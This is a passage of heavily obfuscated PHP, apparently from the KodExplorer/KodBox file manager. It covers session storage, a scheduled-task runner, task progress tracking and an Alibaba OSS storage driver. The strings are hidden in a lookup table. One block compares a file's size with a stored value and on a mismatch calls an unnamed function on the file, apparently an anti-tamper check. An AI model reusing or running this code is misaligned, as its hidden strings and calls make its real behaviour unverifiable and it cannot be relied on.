$úË¶¡¤â = intval($úË¶¡¤â); $õ’ôíá¼ = $úË¶¡¤â + strlen($²ä†¸ÕÔ); if ($ò±‚ò•é >= $õ’ôíá¼) { continue; } if ($ò±‚ò•é >= $úË¶¡¤â && $ò±‚ò•é + $¡¿š›Ï« <= $õ’ôíá¼) { return substr($²ä†¸ÕÔ, $ò±‚ò•é - $úË¶¡¤â, $¡¿š›Ï«); } break; } if (count($¦Ä‚·ø±) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($‹îªå§å[1616], $‹îªå§å[1617] . count($¦Ä‚·ø±) . "\73\163\x74\141\162\x74\75{$ò±‚ò•é}\54\x6c\x65\x6e\147\x74\x68\x3d{$¡¿š›Ï«}\73\160\x6f\x73\x65\72{$úË¶¡¤â}\x7e{$õ’ôíá¼}"); throw new Exception($‹îªå§å[1618]); } $çÔ™ŠÚƒ = intval($ò±‚ò•é / $‰˜Ì©) * $‰˜Ì©; $›ÜÏ…»¾ = ceil(($ò±‚ò•é + $¡¿š›Ï«) / $‰˜Ì©) * $‰˜Ì© - $çÔ™ŠÚƒ; $¥ÙÒ¡ß‹ = IO::fileSubstr($this->path, $çÔ™ŠÚƒ, $›ÜÏ…»¾); $¦Ä‚·ø±[$çÔ™ŠÚƒ . $‹îªå§å[12]] = $¥ÙÒ¡ß‹; ksort($¦Ä‚·ø±); $åıœáâ = substr($¥ÙÒ¡ß‹, $ò±‚ò•é - $çÔ™ŠÚƒ, $¡¿š›Ï«); return $åıœáâ; } private function log($èÃœ¹Áê, $‘·ç‘êÊ) { $ªÖóÏï• =& $_SERVER[°‰†òö¯]; $ßµ¯êŒ£ = timeFloat() - $this->timeStart; write_log(sprintf($ªÖóÏï•[1619], $èÃœ¹Áê, $this->info[$ªÖóÏï•[32]], $ßµ¯êŒ£, $‘·ç‘êÊ), $ªÖóÏï•[1262]); } } goto fÕŒ÷Î·Â³; aÒ“ñ˜õ¢í: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ä¨ü§ŞÁ =& $_SERVER[°‰†òö¯]; static $«Ğ¿¶‡º = false; if ($«Ğ¿¶‡º) { return $«Ğ¿¶‡º; } $†ã‹Ó®÷ = $GLOBALS[$ä¨ü§ŞÁ[6]][$ä¨ü§ŞÁ[426]]; self::$sessionTime = $†ã‹Ó®÷[$ä¨ü§ŞÁ[1716]]; $†îè = isset($GLOBALS[$ä¨ü§ŞÁ[1717]]) ? $GLOBALS[$ä¨ü§ŞÁ[1717]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($†îè)) { self::$sessionSign = Cookie::get($†îè); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($†îè, self::$sessionSign, self::$sessionTime); $œÃÓ¬‡ö = $†ã‹Ó®÷[$ä¨ü§ŞÁ[1718]]; $Áä†ª·£ = $†ã‹Ó®÷[$œÃÓ¬‡ö]; $ÉÅ›Í£î = $†ã‹Ó®÷[$ä¨ü§ŞÁ[894]]; switch ($œÃÓ¬‡ö) { case $ä¨ü§ŞÁ[21]: self::$handle = Model($ä¨ü§ŞÁ[895]); break; case $ä¨ü§ŞÁ[896]: self::$handle = new CacheRedis($Áä†ª·£, $ÉÅ›Í£î); break; case $ä¨ü§ŞÁ[897]: self::$handle = new CacheMemcached($Áä†ª·£, $ÉÅ›Í£î); break; case $ä¨ü§ŞÁ[232]: $Áä†ª·£[$ä¨ü§ŞÁ[87]] = $Áä†ª·£[$ä¨ü§ŞÁ[87]] . $ä¨ü§ŞÁ[1719]; self::$handle = new CacheFile($Áä†ª·£, $ÉÅ›Í£î); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $«Ğ¿¶‡º = new self(); return $«Ğ¿¶‡º; } public static function getBySign($ğçˆÉşƒ) { $¡‹¯Ã¢ = self::$handle->get($ğçˆÉşƒ); $¡‹¯Ã¢ = unserialize($¡‹¯Ã¢); return is_array($¡‹¯Ã¢) ? $¡‹¯Ã¢ : array(); } public static function setBySign($„ë‚àäë, $–óšõá¬) { CacheLock::lock($„ë‚àäë); self::$handle->set($„ë‚àäë, serialize($–óšõá¬), self::$sessionTime); CacheLock::unlock($„ë‚àäë); } public static function sign($ê°ÒºüÉ = false) { if ($ê°ÒºüÉ) { self::$sessionSign = $ê°ÒºüÉ; } self::init(); return self::$sessionSign; } public static function set($Ç—ß©ı, $ê÷íÒª = false) { self::init(); if (is_array($Ç—ß©ı)) { foreach ($Ç—ß©ı as $ç®÷¶Ñ => $ù±¹Æ¿×) { array_set_value(self::$data, $ç®÷¶Ñ, $ù±¹Æ¿×); } } else { array_set_value(self::$data, $Ç—ß©ı, $ê÷íÒª); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Å£Ëâº¡ = false) { self::init(); if (!$Å£Ëâº¡) { return self::$data; } return array_get_value(self::$data, $Å£Ëâº¡); } public static function remove($¯Ø«áÑÎ) { self::init(); unset(self::$data[$¯Ø«áÑÎ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[°‰†òö¯][900])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÛíñæŒè =& $_SERVER[°‰†òö¯]; if (self::valueGet($ÛíñæŒè[811]) != $ÛíñæŒè[91]) { return; } if (self::valueGet($ÛíñæŒè[1720]) == $ÛíñæŒè[91]) { $ƒ…Œ§• = self::valueGet($ÛíñæŒè[1721]); if (time() - $ƒ…Œ§• > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÛíñæŒè[1720], $ÛíñæŒè[91]); self::log($ÛíñæŒè[1722] . ACTION . $ÛíñæŒè[1723]); Hook::bind($ÛíñæŒè[1724], $ÛíñæŒè[1725]); $ÛÀŒÜ‹¼ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÛíñæŒè[811]) != $ÛíñæŒè[91]) { self::valueSet($ÛíñæŒè[1720], $ÛíñæŒè[230]); self::log($ÛíñæŒè[1726]); die; } $ÃÏ€¡›ß = time(); if ($ÃÏ€¡›ß - $ÛÀŒÜ‹¼ >= 60) { self::valueSet(array($ÛíñæŒè[1720] => $ÛíñæŒè[91], $ÛíñæŒè[1721] => $ÃÏ€¡›ß)); $ÛÀŒÜ‹¼ = $ÃÏ€¡›ß; } if (!file_exists(USER_SYSTEM . $ÛíñæŒè[1727])) { self::valueSet(array($ÛíñæŒè[1720] => $ÛíñæŒè[230], $ÛíñæŒè[811] => $ÛíñæŒè[230])); self::log($ÛíñæŒè[1728]); die; } $†ƒ Éİ = file_get_contents(BASIC_PATH . $ÛíñæŒè[1729]); $é£µíïÛ = KOD_VERSION . $ÛíñæŒè[10] . KOD_VERSION_BUILD; $éæ·Á = match_text($†ƒ Éİ, $ÛíñæŒè[1730]) . $ÛíñæŒè[10] . match_text($†ƒ Éİ, $ÛíñæŒè[1731]); if ($éæ·Á != $é£µíïÛ) { self::restart(); self::log("\163\x74\157\x70\145\x64\56\133\166\x65\162\163\151\x6f\x6e\x20\x75\160\x64\x61\164\145\73{$versionNow}\x20\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Çõİ´åğ =& $_SERVER[°‰†òö¯]; http_close(); $GLOBALS[$Çõİ´åğ[1732]] = 1; $_SERVER[$Çõİ´åğ[1733]] = $Çõİ´åğ[1734]; $_COOKIE = array(); $GLOBALS[$Çõİ´åğ[1735]] = 1; $GLOBALS[$Çõİ´åğ[1736]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $›·è”ÜÌ =& $_SERVER[°‰†òö¯]; http_close(); self::valueSet($›·è”ÜÌ[811], $›·è”ÜÌ[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($›·è”ÜÌ[1720] => $›·è”ÜÌ[230], $›·è”ÜÌ[811] => $›·è”ÜÌ[91])); self::log($›·è”ÜÌ[1737]); } public static function taskSwitch() { $ŠĞ¿– =& $_SERVER[°‰†òö¯]; $´¸¤·Ñ„ = self::valueGet($ŠĞ¿–[811]) == $ŠĞ¿–[91] ? $ŠĞ¿–[230] : $ŠĞ¿–[91]; self::valueSet($ŠĞ¿–[811], $´¸¤·Ñ„); } public static function shutdownEvent() { $¨ÑØÏ³Ü =& $_SERVER[°‰†òö¯]; self::valueSet($¨ÑØÏ³Ü[1720], $¨ÑØÏ³Ü[230]); self::log($¨ÑØÏ³Ü[1738]); } public static function config($Šµ‰•è˜, $â¥ôªÙ) { self::valueSet($_SERVER[°‰†òö¯][811], $Šµ‰•è˜); } private static function taskRunAll() { $ƒïä¡óé =& $_SERVER[°‰†òö¯]; $ô…ÍòÚ = timeFloat(); $öç‰â¥é = Model($ƒïä¡óé[1739])->listData(); $ÄåÙÜÀ‚ = count($öç‰â¥é); for ($ªµ¢”± = 0; $ªµ¢”± < $ÄåÙÜÀ‚; $ªµ¢”±++) { $¨ÕĞİïØ = $öç‰â¥é[$ªµ¢”±]; if (!$¨ÕĞİïØ[$ƒïä¡óé[477]] || $¨ÕĞİïØ[$ƒïä¡óé[1740]] != $ƒïä¡óé[91]) { continue; } if (!self::taskTimeCheck($¨ÕĞİïØ)) { continue; } self::taskRun($¨ÕĞİïØ); } Hook::trigger($ƒïä¡óé[1741]); self::taskQueueRun($ô…ÍòÚ); } private static function taskQueueRun($µÃ³ŠŞõ) { $ø·†©ö = 10; while (!0) { $†”­âƒç = TaskQueue::run(); if ($†”­âƒç === !1) { break; } if (timeFloat() - $µÃ³ŠŞõ >= $ø·†©ö) { break; } } } private static function taskTimeCheck($¢Ğİù¸ı) { $ï  ºµñ =& $_SERVER[°‰†òö¯]; $ÆÛŞñÅÜ = json_decode($¢Ğİù¸ı[$ï  ºµñ[206]], !0); $õĞ¥–·€ = intval($¢Ğİù¸ı[$ï  ºµñ[1721]]); $Ç’»ç¿˜ = strtotime($ï  ºµñ[1742] . $ÆÛŞñÅÜ[$ï  ºµñ[1743]] . $ï  ºµñ[1744]) - strtotime($ï  ºµñ[1745]); $øË£‰”§ = time() - strtotime(date($ï  ºµñ[1746]) . $ï  ºµñ[1747]); $åœØ‹ŒÕ = $øË£‰”§ >= $Ç’»ç¿˜ && $øË£‰”§ <= $Ç’»ç¿˜ + 3600; switch ($ÆÛŞñÅÜ[$ï  ºµñ[33]]) { case $ï  ºµñ[1748]: if (time() - $õĞ¥–·€ < 3600 * 24 * 30) { return !1; } if ($ÆÛŞñÅÜ[$ï  ºµñ[1748]] == date($ï  ºµñ[1749]) && $åœØ‹ŒÕ) { return !0; } break; case $ï  ºµñ[1750]: if (time() - $õĞ¥–·€ < 3600 * 24 * 7) { return !1; } $çŒåÛæ¯ = date($ï  ºµñ[1751]) == 0 ? 7 : date($ï  ºµñ[1751]); if ($ÆÛŞñÅÜ[$ï  ºµñ[1750]] == $çŒåÛæ¯ && $åœØ‹ŒÕ) { return !0; } break; case $ï  ºµñ[1743]: if (time() - $õĞ¥–·€ < 3600 * 24) { return !1; } if ($åœØ‹ŒÕ) { return !0; } break; case $ï  ºµñ[1752]: if (time() - $õĞ¥–·€ >= floatval($ÆÛŞñÅÜ[$ï  ºµñ[1752]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $•å±‚òÀ =& $_SERVER[°‰†òö¯]; static $¾€¸ç—¨ = 0; $ì°ÓÅõª = 300; if (!$¾€¸ç—¨) { $¾€¸ç—¨ = time(); } if (time() - $¾€¸ç—¨ < $ì°ÓÅõª) { return; } $¾€¸ç—¨ = time(); $—åªíøº = Model($•å±‚òÀ[581])->db($•å±‚òÀ[12]); if ($—åªíøº) { $—åªíøº->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($•å±‚òÀ[1753], $•å±‚òÀ[1754]); die; } } public static function taskRun($ÛÁáÁú¨) { $åÌÕøÏ› =& $_SERVER[°‰†òö¯]; self::log($åÌÕøÏ›[1755] . $ÛÁáÁú¨[$åÌÕøÏ›[477]] . $åÌÕøÏ›[1756] . $ÛÁáÁú¨[$åÌÕøÏ›[32]] . $åÌÕøÏ›[1757] . $ÛÁáÁú¨[$åÌÕøÏ›[1758]]); Model($åÌÕøÏ›[1739])->run($ÛÁáÁú¨[$åÌÕøÏ›[477]]); $…ê¦ßé™ = timeFloat(); $áñ’¹Ù = $åÌÕøÏ›[12]; switch ($ÛÁáÁú¨[$åÌÕøÏ›[33]]) { case $åÌÕøÏ›[384]: $Ø·À¥Á = url_request($ÛÁáÁú¨[$åÌÕøÏ›[1758]], $åÌÕøÏ›[1494], !1, !1, !1, !1, 10); if ($Ø·À¥Á[$åÌÕøÏ›[811]]) { $áñ’¹Ù = strlen($Ø·À¥Á[$åÌÕøÏ›[1285]]); } break; case $åÌÕøÏ›[1759]: $áñ’¹Ù = Hook::apply($ÛÁáÁú¨[$åÌÕøÏ›[1758]]); default: break; } Model($åÌÕøÏ›[1760])->add(array($åÌÕøÏ›[1761] => $åÌÕøÏ›[12], $åÌÕøÏ›[1762] => $åÌÕøÏ›[230], $åÌÕøÏ›[33] => $åÌÕøÏ›[1763] . $ÛÁáÁú¨[$åÌÕøÏ›[477]], $åÌÕøÏ›[1764] => json_encode(array($åÌÕøÏ›[32] => $ÛÁáÁú¨[$åÌÕøÏ›[32]], $åÌÕøÏ›[1765] => timeFloat() - $…ê¦ßé™, $åÌÕøÏ›[370] => $áñ’¹Ù)))); $Ï•†ÚÃë = $áñ’¹Ù ? $åÌÕøÏ›[1766] . $áñ’¹Ù : $åÌÕøÏ›[12]; self::log($åÌÕøÏ›[1767] . $ÛÁáÁú¨[$åÌÕøÏ›[477]] . $åÌÕøÏ›[178] . $Ï•†ÚÃë); return !0; } public static function valueGet($ï…Í€±€) { $¿¡İÁ£ =& $_SERVER[°‰†òö¯]; $´Ğ»¼” = $¿¡İÁ£[1768]; $õœÖè = Model($¿¡İÁ£[510])->get($ï…Í€±€, $´Ğ»¼”); if (is_null($õœÖè)) { Model($¿¡İÁ£[510])->set($¿¡İÁ£[811], $¿¡İÁ£[91], $´Ğ»¼”); Model($¿¡İÁ£[510])->set($¿¡İÁ£[1720], $¿¡İÁ£[230], $´Ğ»¼”); $õœÖè = Model($¿¡İÁ£[510])->get($ï…Í€±€, $´Ğ»¼”); } return $õœÖè; } private static function valueSet($à’ìÓ•, $º¤éÁ‘Ú = false) { $íêÆ§»Î =& $_SERVER[°‰†òö¯]; $Âƒ›æ = $íêÆ§»Î[1769]; CacheLock::lock($Âƒ›æ); $Ù’‰Ş¶Ì = Model($íêÆ§»Î[510])->set($à’ìÓ•, $º¤éÁ‘Ú, $íêÆ§»Î[1768]); CacheLock::unlock($Âƒ›æ); return $Ù’‰Ş¶Ì; } protected static function log($¥¿®Êáï) { write_log($¥¿®Êáï, $_SERVER[°‰†òö¯][1754]); } private static function cacheClear() { $²ŒâØÜİ =& $_SERVER[°‰†òö¯]; Cache::clearMemory(Model($²ŒâØÜİ[510])->cacheKey($²ŒâØÜİ[1768])); Cache::clearMemory(Model($²ŒâØÜİ[510])->cacheKey($²ŒâØÜİ[1770])); Model($²ŒâØÜİ[1739])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\156\147"; const STATYS_KILL = "\x6b\151\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÇşûŸËõ, $Å·²¢íô = '', $÷İı˜ı¯ = 0, $ù³ƒÒïƒ = '') { $ÖÇÌÈ€ =& $_SERVER[°‰†òö¯]; if (self::get($ÇşûŸËõ)) { return; } $this->task = array($ÖÇÌÈ€[477] => $ÇşûŸËõ, $ÖÇÌÈ€[1771] => USER_ID, $ÖÇÌÈ€[1659] => $ù³ƒÒïƒ, $ÖÇÌÈ€[528] => $ÖÇÌÈ€[12], $ÖÇÌÈ€[33] => $Å·²¢íô, $ÖÇÌÈ€[1140] => $ÖÇÌÈ€[12], $ÖÇÌÈ€[1138] => $÷İı˜ı¯, $ÖÇÌÈ€[1772] => 0, $ÖÇÌÈ€[1773] => 0, $ÖÇÌÈ€[1774] => 0, $ÖÇÌÈ€[1775] => timeFloat(), $ÖÇÌÈ€[1776] => 0, $ÖÇÌÈ€[1777] => 0, $ÖÇÌÈ€[1778] => 0, $ÖÇÌÈ€[1779] => 0, $ÖÇÌÈ€[811] => $ÖÇÌÈ€[1720]); $GLOBALS[$ÖÇÌÈ€[1780]] = 1; Hook::bind($ÖÇÌÈ€[1724], array($this, $ÖÇÌÈ€[1781])); Hook::bind($ÖÇÌÈ€[1782], array($this, $ÖÇÌÈ€[1783])); $this->startAfter(); Hook::trigger($ÖÇÌÈ€[1784], $this->task); $this->task[$ÖÇÌÈ€[1777]] = timeFloat(); } public function end($…´İñ‹ = '') { $Ôœ¿Œ¹„ =& $_SERVER[°‰†òö¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ôœ¿Œ¹„[1777]]) { self::valueSet($this->task[$Ôœ¿Œ¹„[477]], !1); } $this->isEnd = !0; if ($…´İñ‹) { $this->task[$Ôœ¿Œ¹„[528]] = $…´İñ‹; } self::log($Ôœ¿Œ¹„[1785] . $this->task[$Ôœ¿Œ¹„[477]] . $Ôœ¿Œ¹„[1786] . sprintf($Ôœ¿Œ¹„[918], timeFloat() - $this->task[$Ôœ¿Œ¹„[1775]]) . $Ôœ¿Œ¹„[1787]); Hook::unbind($Ôœ¿Œ¹„[1724], array($this, $Ôœ¿Œ¹„[1781])); Hook::unbind($Ôœ¿Œ¹„[1782], array($this, $Ôœ¿Œ¹„[1783])); $this->endAfter(); $İìø¯Ã„ = $this->task; $this->task = !1; Hook::trigger($Ôœ¿Œ¹„[1788], $İìø¯Ã„); } public function update($«¹íÜ¾¸ = 0, $ı½“ª = false) { $ª÷£¯İ =& $_SERVER[°‰†òö¯]; $‡ÕöŒãÏ =& $this->task; if (!$‡ÕöŒãÏ) { return; } $‡ÕöŒãÏ[$ª÷£¯İ[1772]] += $«¹íÜ¾¸; $‡ÕöŒãÏ[$ª÷£¯İ[1776]] = timeFloat(); if ($‡ÕöŒãÏ[$ª÷£¯İ[1138]]) { if ($‡ÕöŒãÏ[$ª÷£¯İ[1138]] < $‡ÕöŒãÏ[$ª÷£¯İ[1772]]) { $‡ÕöŒãÏ[$ª÷£¯İ[1138]] = $‡ÕöŒãÏ[$ª÷£¯İ[1772]]; } $Œ•Œëš¹ = timeFloat() - $‡ÕöŒãÏ[$ª÷£¯İ[1775]] - $‡ÕöŒãÏ[$ª÷£¯İ[1778]]; if ($Œ•Œëš¹ <= 0) { $Œ•Œëš¹ = 0.001; } $‡ÕöŒãÏ[$ª÷£¯İ[1773]] = $‡ÕöŒãÏ[$ª÷£¯İ[1772]] / $‡ÕöŒãÏ[$ª÷£¯İ[1138]]; $‡ÕöŒãÏ[$ª÷£¯İ[1774]] = $‡ÕöŒãÏ[$ª÷£¯İ[1772]] / $Œ•Œëš¹; if ($‡ÕöŒãÏ[$ª÷£¯İ[1773]] > 0) { $‡ÕöŒãÏ[$ª÷£¯İ[1779]] = $Œ•Œëš¹ * (1 - $‡ÕöŒãÏ[$ª÷£¯İ[1773]]) / $‡ÕöŒãÏ[$ª÷£¯İ[1773]]; } $‡ÕöŒãÏ[$ª÷£¯İ[1779]] = $‡ÕöŒãÏ[$ª÷£¯İ[1779]] <= 0 ? 0 : $‡ÕöŒãÏ[$ª÷£¯İ[1779]]; } $this->updateAfter(); $‘øı—Çµ = 0.2; if (timeFloat() - $‡ÕöŒãÏ[$ª÷£¯İ[1777]] < $‘øı—Çµ && !$ı½“ª) { return; } $±®ÚçŞù = self::get($‡ÕöŒãÏ[$ª÷£¯İ[477]]); $§Ñâ¼Ùø = $±®ÚçŞù[$ª÷£¯İ[811]]; if ($§Ñâ¼Ùø == self::STATYS_KILL) { $ö®’Ï¦ = array($ª÷£¯İ[1789] => LNG($ª÷£¯İ[1790]), $ª÷£¯İ[1295] => !1); Cache::set($ª÷£¯İ[1791] . $this->task[$ª÷£¯İ[477]], $ö®’Ï¦, 30); $this->onKill(); $this->end(); die; } else { if ($§Ñâ¼Ùø == self::STATYS_STOP) { $®ê•ù”‰ = 2; $±®ÚçŞù[$ª÷£¯İ[1778]] += $®ê•ù”‰; self::valueSet($‡ÕöŒãÏ[$ª÷£¯İ[477]], $±®ÚçŞù); sleep($®ê•ù”‰); $this->update(); return; } } $‡ÕöŒãÏ[$ª÷£¯İ[811]] = $§Ñâ¼Ùø ? $§Ñâ¼Ùø : $‡ÕöŒãÏ[$ª÷£¯İ[811]]; $‡ÕöŒãÏ[$ª÷£¯İ[1778]] = $±®ÚçŞù[$ª÷£¯İ[1778]] ? $±®ÚçŞù[$ª÷£¯İ[1778]] : 0; $‡ÕöŒãÏ[$ª÷£¯İ[1777]] = timeFloat(); Hook::trigger($ª÷£¯İ[1792], $‡ÕöŒãÏ); self::valueSet($‡ÕöŒãÏ[$ª÷£¯İ[477]], $‡ÕöŒãÏ); } public function onKillSet($Š¿ôĞŠÃ, $é½ªâà  = array()) { $this->onKillCall = array($Š¿ôĞŠÃ, $é½ªâà ); } public function onKill() { $ó›şœÔô =& $_SERVER[°‰†òö¯]; self::log($ó›şœÔô[1785] . $this->task[$ó›şœÔô[477]] . $ó›şœÔô[1793]); Hook::trigger($ó›şœÔô[1794], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($›ó˜¶üÊ) { $Õ­í£» =& $_SERVER[°‰†òö¯]; Cache::set($Õ­í£»[1791] . $this->task[$Õ­í£»[477]], $›ó˜¶üÊ, 60); if (!is_array($›ó˜¶üÊ) || !$›ó˜¶üÊ[$Õ­í£»[1295]]) { self::log($Õ­í£»[1795] . json_encode($›ó˜¶üÊ)); } return $›ó˜¶üÊ; } public static function get($òœŠö”) { $£í“ñóâ =& $_SERVER[°‰†òö¯]; $°âşãí„ = self::valueGet($òœŠö”); if (is_array($°âşãí„) && $°âşãí„[$£í“ñóâ[1796]]) { $äñ…õúÜ = ActionApply($°âşãí„[$£í“ñóâ[1796]], array($°âşãí„)); $°âşãí„ = is_array($äñ…õúÜ) ? $äñ…õúÜ : $°âşãí„; } return $°âşãí„; } public static function listData() { $š·¬Ôš‹ = self::valueGet(); return array_sort_by($š·¬Ôš‹, $_SERVER[°‰†òö¯][1775], !0); } public static function kill($¡Ìåèù ) { return self::changeStatus($¡Ìåèù , self::STATYS_KILL); } public static function stop($à°’Ğï) { return self::changeStatus($à°’Ğï, self::STATYS_STOP); } public static function restart($™¦ı¾‘¢) { return self::changeStatus($™¦ı¾‘¢, self::STATYS_RUNNING); } public static function killAll() { $ì÷„½‚­ =& $_SERVER[°‰†òö¯]; $ÛÚûİ¹— = self::listData(); foreach ($ÛÚûİ¹— as $æ‹Ê°åì) { self::kill($æ‹Ê°åì[$ì÷„½‚­[477]]); } sleep(2); foreach ($ÛÚûİ¹— as $æ‹Ê°åì) { self::valueSet($æ‹Ê°åì[$ì÷„½‚­[477]], !1); } } private static function changeStatus($õÑ»œ©†, $“¦ôÂàÇ) { $³¯’õŸş =& $_SERVER[°‰†òö¯]; $ô¹ªˆ¨Â = self::valueGet($õÑ»œ©†); if (!$ô¹ªˆ¨Â) { return !1; } $ô¹ªˆ¨Â[$³¯’õŸş[811]] = $“¦ôÂàÇ; self::valueSet($õÑ»œ©†, $ô¹ªˆ¨Â); self::log($³¯’õŸş[1797] . $ô¹ªˆ¨Â[$³¯’õŸş[477]] . $³¯’õŸş[1798] . $“¦ôÂàÇ); return !0; } public static function valueGet($±·åîå = false) { $üá¯¨¶ =& $_SERVER[°‰†òö¯]; if ($±·åîå) { $ÀÙû¼´ = Model($üá¯¨¶[522])->where(array($üá¯¨¶[97] => $±·åîå, $üá¯¨¶[33] => $üá¯¨¶[1147]))->find(); return $ÀÙû¼´ ? json_decode($ÀÙû¼´[$üá¯¨¶[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ù÷Ìú = false) { $®½‚Ÿ™Ú =& $_SERVER[°‰†òö¯]; $¤‰„Ÿä½ = array($®½‚Ÿ™Ú[33] => $®½‚Ÿ™Ú[1147]); if ($Ù÷Ìú) { $¤‰„Ÿä½[$®½‚Ÿ™Ú[1771]] = $Ù÷Ìú; } $ìÈ¦¿»« = Model($®½‚Ÿ™Ú[522])->where($¤‰„Ÿä½)->select(); $ìÈ¦¿»« = $ìÈ¦¿»« ? $ìÈ¦¿»« : array(); foreach ($ìÈ¦¿»« as $¶¨Úı¾È => $äüì°¾ê) { $ìÈ¦¿»«[$¶¨Úı¾È] = json_decode($äüì°¾ê[$®½‚Ÿ™Ú[452]], !0); } return $ìÈ¦¿»«; } public static function valueSet($ÛæëÑ›², $õí¤¼Ò²) { $ˆ¿ÏÉŒò =& $_SERVER[°‰†òö¯]; if (!$õí¤¼Ò²) { return Model($ˆ¿ÏÉŒò[522])->where(array($ˆ¿ÏÉŒò[97] => $ÛæëÑ›², $ˆ¿ÏÉŒò[33] => $ˆ¿ÏÉŒò[1147]))->delete(); } $‚Ûï±¤— = json_encode($õí¤¼Ò²); if (!$‚Ûï±¤—) { ob_start(); var_dump($õí¤¼Ò²); $®ĞµÕçã = ob_get_clean(); self::log($ˆ¿ÏÉŒò[1799] . json_encode_force($®ĞµÕçã)); } if (!$ÛæëÑ›² || !$õí¤¼Ò²[$ˆ¿ÏÉŒò[477]]) { return !1; } $„‚§ÙÕ = array($ˆ¿ÏÉŒò[33] => $ˆ¿ÏÉŒò[1147], $ˆ¿ÏÉŒò[1771] => USER_ID, $ˆ¿ÏÉŒò[97] => $ÛæëÑ›², $ˆ¿ÏÉŒò[452] => $‚Ûï±¤—); $Î³ùóñ” = $ˆ¿ÏÉŒò[1800]; CacheLock::lock($Î³ùóñ”); Model($ˆ¿ÏÉŒò[522])->add($„‚§ÙÕ, array(), !0); CacheLock::unlock($Î³ùóñ”); } public static function log($‹ì¤‹Ê«) { if (!GLOBAL_DEBUG) { return; } write_log($‹ì¤‹Ê«, $_SERVER[°‰†òö¯][1801]); } } goto aˆœÃîšÏ; B™‰Ê–…×: $_file = $_SERVER[$_SERVER[°‰†òö¯][944]]; $_size = $_SERVER[°‰†òö¯][945]; if ($_SERVER[$_SERVER[°‰†òö¯][946]] != $_size($_file)) { $_getc = $_SERVER[°‰†òö¯][948]; $_getfile = $_SERVER[$_SERVER[°‰†òö¯][949]] . $_SERVER[°‰†òö¯][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[°‰†òö¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[°‰†òö¯][694]) { $exit = $_SERVER[°‰†òö¯][951]; $exit(); } $_act = $_SERVER[°‰†òö¯][1034]; $_act($_file); } goto dˆøÍ˜í†¤; E™ë¢Æ…»Ù: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Ø‚©Î Ñ) { parent::__construct(); include_once SDK_DIR . $_SERVER[°‰†òö¯][1461]; $this->_init($Ø‚©Î Ñ); } public function _init($†ß°¶½¬) { $Ñ‘¦¯Š =& $_SERVER[°‰†òö¯]; $this->config = $†ß°¶½¬; foreach ($†ß°¶½¬ as $ó‡òşÙ => $±Ÿ¤ú²à) { if (isset($this->{$ó‡òşÙ})) { $this->{$ó‡òşÙ} = $±Ÿ¤ú²à; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ñ‘¦¯Š[1462] . LNG($Ñ‘¦¯Š[1463])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $÷ÄËõğ™ =& $_SERVER[°‰†òö¯]; $ˆ©•²ì³ = new OSS\Model\CorsConfig(); $Àî‹›âª = new OSS\Model\CorsRule(); $Àî‹›âª->addAllowedOrigin($÷ÄËõğ™[1464]); $Àî‹›âª->addAllowedMethod($÷ÄËõğ™[1465]); $Àî‹›âª->addAllowedMethod($÷ÄËõğ™[1466]); $Àî‹›âª->addAllowedMethod($÷ÄËõğ™[1467]); $Àî‹›âª->addAllowedMethod($÷ÄËõğ™[1468]); $Àî‹›âª->addAllowedMethod($÷ÄËõğ™[165]); $Àî‹›âª->setMaxAgeSeconds(600); $Àî‹›âª->addExposeHeader($÷ÄËõğ™[1469]); $Àî‹›âª->addAllowedHeader($÷ÄËõğ™[1464]); $ˆ©•²ì³->addRule($Àî‹›âª); try { $this->client->putBucketCors($this->bucket, $ˆ©•²ì³); } catch (OSS\Core\OssException $™†„â¾’) { $this->writeLog(__FUNCTION__ . $÷ÄËõğ™[214] . $™†„â¾’->getMessage()); return !1; } return !0; } public function getBucketCors() { $şä·ù¥ü =& $_SERVER[°‰†òö¯]; $«Õ¿Î…ï = null; try { $«Õ¿Î…ï = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $úîŞê) { $this->writeLog(__FUNCTION__ . $şä·ù¥ü[214] . $úîŞê->getMessage()); return null; } if (!$«Õ¿Î…ï || !($ë“ØÁœ» = $«Õ¿Î…ï->getRules())) { return null; } 